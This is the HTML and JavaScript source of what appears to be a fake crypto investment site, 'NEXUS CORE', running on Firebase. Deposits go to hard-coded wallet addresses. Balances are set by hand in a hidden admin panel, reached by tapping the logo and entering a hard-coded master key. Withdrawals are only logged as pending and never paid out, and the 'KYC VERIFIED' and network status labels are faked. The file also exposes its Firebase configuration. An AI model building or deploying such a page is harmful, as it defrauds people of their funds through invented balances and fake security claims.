<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS CORE | Institutional Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --gold: #f3ba2f; --bg: #010204; }
        body.dark-mode { background-color: var(--bg); color: #ffffff; }
        body.light-mode { background-color: #f8fafc; color: #0f172a; }
        .glass { backdrop-filter: blur(25px); border: 1px solid rgba(128,128,128,0.08); }
        .dark-mode .glass { background: rgba(15, 18, 23, 0.85); }
        .light-mode .glass { background: rgba(255, 255, 255, 0.8); }
        .crypto-text { background: linear-gradient(90deg, #f3ba2f, #ffffff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .hidden-section { display: none; }
        .step-active { color: var(--gold); border-bottom: 2px solid var(--gold); }
        input, select { background: rgba(0,0,0,0.2) !important; border: 1px solid rgba(255,255,255,0.1) !important; color: inherit; }
        .loader-ring { border: 3px solid rgba(243, 186, 47, 0.1); border-top: 3px solid var(--gold); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body class="dark-mode transition-all duration-500">

    <nav class="glass sticky top-0 z-[100] px-8 py-5 flex items-center justify-between border-b border-white/5">
        <div class="flex items-center gap-4 cursor-pointer" id="master-logo">
            <div class="w-11 h-11 bg-[#f3ba2f] rounded-2xl flex items-center justify-center font-black text-black text-xl shadow-lg">N</div>
            <span class="text-xl font-black italic tracking-tighter uppercase">Nexus<span class="crypto-text">Core</span></span>
        </div>
        <div class="flex items-center gap-5">
            <div id="status-dot" class="flex items-center gap-2 bg-green-500/10 px-3 py-1 rounded-full">
                <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                <span class="text-[9px] font-bold text-green-500 uppercase tracking-widest">Mainnet Live</span>
            </div>
            <button onclick="toggleTheme()" class="text-lg opacity-60 hover:opacity-100"><i class="fa-solid fa-circle-half-stroke"></i></button>
        </div>
    </nav>

    <section id="dashboard-section" class="section container mx-auto px-6 py-10">
        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8 mb-12">
            <div class="lg:col-span-2 glass p-10 rounded-[50px] border-l-[10px] border-[#f3ba2f]">
                <p class="text-[10px] font-black text-gray-500 uppercase tracking-[0.3em] mb-4">Institutional Balance</p>
                <h2 id="balance-display" class="text-7xl font-black italic tracking-tighter mb-10">$0.00</h2>
                <div class="flex gap-4">
                    <button onclick="openPortal('deposit')" class="flex-1 bg-[#f3ba2f] text-black py-5 rounded-2xl font-black text-xs uppercase shadow-xl hover:scale-[1.02] transition">Add Funds</button>
                    <button onclick="openPortal('withdraw')" class="flex-1 bg-white/5 border border-white/10 py-5 rounded-2xl font-black text-xs uppercase hover:bg-white/10 transition">Withdraw</button>
                </div>
            </div>
            <div class="glass p-10 rounded-[50px] space-y-8">
                <div><p class="text-[9px] font-black text-gray-500 uppercase mb-2">Security Status</p><p class="text-xl font-black text-green-500"><i class="fa-solid fa-shield-check mr-2"></i>KYC VERIFIED</p></div>
                <div><p class="text-[9px] font-black text-gray-500 uppercase mb-2">Network Load</p><p class="text-xl font-black text-blue-400">OPTIMAL (12ms)</p></div>
            </div>
        </div>

        <div class="glass p-10 rounded-[40px]">
            <h3 class="text-xs font-black uppercase tracking-widest mb-8 text-gray-400">Global Transaction Ledger</h3>
            <div id="tx-history" class="space-y-4">
                <p class="text-xs italic text-gray-600">No recent network activity...</p>
            </div>
        </div>
    </section>

    <div id="action-portal" class="fixed inset-0 z-[500] bg-black/95 backdrop-blur-xl hidden flex items-center justify-center p-6">
        <div class="glass w-full max-w-xl rounded-[60px] p-12 relative overflow-hidden">
            <button onclick="closePortal()" class="absolute top-8 right-10 text-4xl opacity-50">&times;</button>
            
            <div id="portal-content">
                <div id="deposit-ui" class="hidden">
                    <h2 class="text-3xl font-black italic mb-8 uppercase">Initialize Funding</h2>
                    <div class="space-y-4 mb-8">
                        <label class="text-[10px] font-black uppercase text-gray-500">Select Asset Network</label>
                        <select id="dep-net" class="w-full p-4 rounded-xl text-xs font-bold" onchange="updateWalletAddr()">
                            <option value="USDT_TRC20">USDT (TRC20) - Fast & Low Fee</option>
                            <option value="USDT_BEP20">USDT (BEP20) - Binance Smart Chain</option>
                            <option value="ETH_ERC20">Ethereum (ERC20) - High Security</option>
                        </select>
                    </div>
                    <div class="bg-yellow-500/5 p-6 rounded-3xl border border-yellow-500/20 mb-8 text-center">
                        <p class="text-[9px] font-black text-yellow-500 mb-2 uppercase tracking-widest">Send Only <span id="sel-net-name">USDT TRC20</span> to this Address:</p>
                        <p id="sel-wallet-addr" class="text-sm font-mono font-black break-all mb-4 text-white">TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ</p>
                        <button onclick="copyCurrentAddr()" class="text-[9px] font-black bg-white/10 px-4 py-2 rounded-lg hover:bg-[#f3ba2f] hover:text-black transition">COPY ADDRESS</button>
                    </div>
                    <div class="grid grid-cols-2 gap-4 mb-8">
                        <input type="number" id="dep-amt" placeholder="Amount (USD)" class="p-4 rounded-xl text-xs font-black">
                        <input type="text" id="dep-hash" placeholder="TxID / Hash" class="p-4 rounded-xl text-xs font-mono uppercase">
                    </div>
                    <button onclick="submitDeposit()" class="w-full bg-[#f3ba2f] text-black font-black py-5 rounded-2xl shadow-xl uppercase text-xs">Request Settlement</button>
                </div>

                <div id="withdraw-ui" class="hidden">
                    <h2 class="text-3xl font-black italic mb-8 uppercase text-red-500">Liquidate Assets</h2>
                    <div class="space-y-6">
                        <div>
                            <label class="text-[10px] font-black uppercase text-gray-500 mb-2 block">Destination Wallet</label>
                            <input type="text" id="wit-addr" placeholder="Enter Receiver Address" class="w-full p-4 rounded-xl text-xs font-mono">
                        </div>
                        <div>
                            <label class="text-[10px] font-black uppercase text-gray-500 mb-2 block">Amount to Extract</label>
                            <input type="number" id="wit-amt" placeholder="0.00" class="w-full p-6 rounded-xl text-4xl font-black text-center">
                            <p class="text-[9px] text-gray-500 mt-2 text-center italic">Network Fee: 1.5% | Security Delay: 0-12 Hours</p>
                        </div>
                        <button onclick="submitWithdraw()" class="w-full bg-white text-black font-black py-5 rounded-2xl shadow-xl uppercase text-xs">Authorize Extraction</button>
                    </div>
                </div>

                <div id="processing-ui" class="hidden text-center py-10 animate__animated animate__pulse animate__infinite">
                    <div class="loader-ring mx-auto mb-8"></div>
                    <h3 class="text-2xl font-black italic uppercase mb-2">Node Synchronization</h3>
                    <p class="text-xs text-gray-500 tracking-widest font-bold">SCANNING BLOCKCHAIN FOR CONFIRMATIONS...</p>
                </div>
            </div>
        </div>
    </div>

    <div id="admin-panel" class="fixed inset-0 z-[600] bg-black hidden overflow-y-auto p-10">
        <div class="max-w-4xl mx-auto">
            <div class="flex justify-between items-center mb-12">
                <h2 class="text-4xl font-black italic text-[#f3ba2f] uppercase">Nexus Master Admin</h2>
                <button onclick="location.reload()" class="text-4xl">&times;</button>
            </div>
            <div id="admin-user-cards" class="grid grid-cols-1 gap-6"></div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, update, onValue, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBEqvT7AYCTZg1Bb6zEDtJn71QrYopX73M",
            authDomain: "coin-07.firebaseapp.com",
            databaseURL: "https://coin-07-default-rtdb.firebaseio.com",
            projectId: "coin-07",
            storageBucket: "coin-07.firebasestorage.app",
            messagingSenderId: "341970060013",
            appId: "1:341970060013:web:67374c0fd262b63bd342e4"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        let userUID = localStorage.getItem('nexus_uid');

        // --- PORTAL CONTROLS ---
        window.openPortal = (type) => {
            document.getElementById('action-portal').classList.remove('hidden');
            document.getElementById('deposit-ui').classList.add('hidden');
            document.getElementById('withdraw-ui').classList.add('hidden');
            document.getElementById('processing-ui').classList.add('hidden');
            document.getElementById(type + '-ui').classList.remove('hidden');
        };

        window.closePortal = () => document.getElementById('action-portal').classList.add('hidden');

        window.updateWalletAddr = () => {
            const net = document.getElementById('dep-net').value;
            const addrEl = document.getElementById('sel-wallet-addr');
            const nameEl = document.getElementById('sel-net-name');
            if(net === 'USDT_TRC20') { addrEl.innerText = "TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ"; nameEl.innerText = "USDT TRC20"; }
            else if(net === 'USDT_BEP20') { addrEl.innerText = "0xD9359EADE5F5bACA51fb7da043767Bc0685bC355"; nameEl.innerText = "USDT BEP20"; }
            else { addrEl.innerText = "0xD9359EADE5F5bACA51fb7da043767Bc0685bC355"; nameEl.innerText = "ETH ERC20"; }
        };

        window.copyCurrentAddr = () => {
            navigator.clipboard.writeText(document.getElementById('sel-wallet-addr').innerText);
            alert("Secure Address Copied, sweetie!");
        };

        // --- SYSTEM CORE ---
        window.submitDeposit = async () => {
            const amt = document.getElementById('dep-amt').value;
            const hash = document.getElementById('dep-hash').value;
            if(!amt || !hash) return alert("Fill details!");

            document.getElementById('deposit-ui').classList.add('hidden');
            document.getElementById('processing-ui').classList.remove('hidden');

            const tx = { type: 'DEPOSIT', amt: amt, hash: hash, date: new Date().toLocaleString(), status: 'PENDING' };
            const histRef = ref(db, `users/${userUID}/history`);
            const snap = await get(histRef);
            let h = snap.exists() ? snap.val() : [];
            h.unshift(tx);
            await update(ref(db, `users/${userUID}`), { history: h });

            setTimeout(() => {
                alert("Deposit Received! Awaiting Node Confirmation.");
                closePortal();
            }, 3000);
        };

        window.submitWithdraw = async () => {
            const amt = parseFloat(document.getElementById('wit-amt').value);
            const addr = document.getElementById('wit-addr').value;
            const snap = await get(ref(db, `users/${userUID}`));
            const bal = snap.val().balance;

            if(!amt || amt > bal) return alert("Insufficient Assets!");
            
            document.getElementById('withdraw-ui').classList.add('hidden');
            document.getElementById('processing-ui').classList.remove('hidden');

            const tx = { type: 'WITHDRAW', amt: amt, addr: addr, date: new Date().toLocaleString(), status: 'PENDING' };
            let h = snap.val().history || [];
            h.unshift(tx);
            await update(ref(db, `users/${userUID}`), { history: h });

            setTimeout(() => {
                alert("Liquidation Request Protocol Initiated.");
                closePortal();
            }, 3000);
        };

        // --- SYNC DATA ---
        if(userUID) {
            onValue(ref(db, `users/${userUID}`), (snap) => {
                const data = snap.val();
                if(data) {
                    document.getElementById('balance-display').innerText = '$' + data.balance.toLocaleString(undefined, {minimumFractionDigits:2});
                    const histBox = document.getElementById('tx-history');
                    if(data.history) {
                        histBox.innerHTML = data.history.slice(0, 5).map(i => `
                            <div class="glass p-5 rounded-2xl flex justify-between items-center border border-white/5">
                                <div><p class="text-[9px] font-black text-[#f3ba2f]">${i.type}</p><p class="text-[10px] opacity-40 italic">${i.date}</p></div>
                                <div class="text-right"><p class="text-sm font-black">$${parseFloat(i.amt).toLocaleString()}</p><p class="text-[8px] font-black ${i.status==='PENDING'?'text-yellow-500':'text-green-500'}">${i.status}</p></div>
                            </div>
                        `).join('');
                    }
                }
            });
        } else {
            const email = prompt("Institutional Email Required:");
            if(email) {
                userUID = email.replace(/[.#$[\]]/g, "_");
                localStorage.setItem('nexus_uid', userUID);
                set(ref(db, `users/${userUID}`), { email: email, balance: 0, history: [] });
                location.reload();
            }
        }

        // --- MASTER ADMIN (TAP TAP LOGO) ---
        let taps = 0;
        document.getElementById('master-logo').onclick = () => {
            taps++;
            if(taps === 4) {
                if(prompt("Master Key:") === "coin786") loadMasterAdmin();
                taps = 0;
            }
            setTimeout(() => taps = 0, 3000);
        };

        window.loadMasterAdmin = () => {
            document.getElementById('admin-panel').classList.remove('hidden');
            onValue(ref(db, 'users'), (snap) => {
                const users = snap.val();
                let html = "";
                for(let id in users) {
                    html += `
                        <div class="glass p-8 rounded-[35px] border border-white/10 flex flex-col md:flex-row justify-between items-center gap-6">
                            <div><p class="text-xs font-black text-[#f3ba2f]">${users[id].email}</p><h4 class="text-3xl font-black italic">$${users[id].balance.toLocaleString()}</h4></div>
                            <div class="flex gap-2">
                                <button onclick="modBal('${id}')" class="bg-blue-600 px-6 py-3 rounded-xl text-[10px] font-black uppercase">Edit Bal</button>
                                <button onclick="viewHist('${id}')" class="bg-white/10 px-6 py-3 rounded-xl text-[10px] font-black uppercase">View Requests</button>
                            </div>
                        </div>
                    `;
                }
                document.getElementById('admin-user-cards').innerHTML = html;
            });
        };

        window.modBal = (id) => {
            const val = prompt("Enter New Balance:");
            if(val) update(ref(db, `users/${id}`), { balance: parseFloat(val) });
        };

        window.toggleTheme = () => {
            document.body.classList.toggle('dark-mode');
            document.body.classList.toggle('light-mode');
        };
    </script>
</body>
</html>
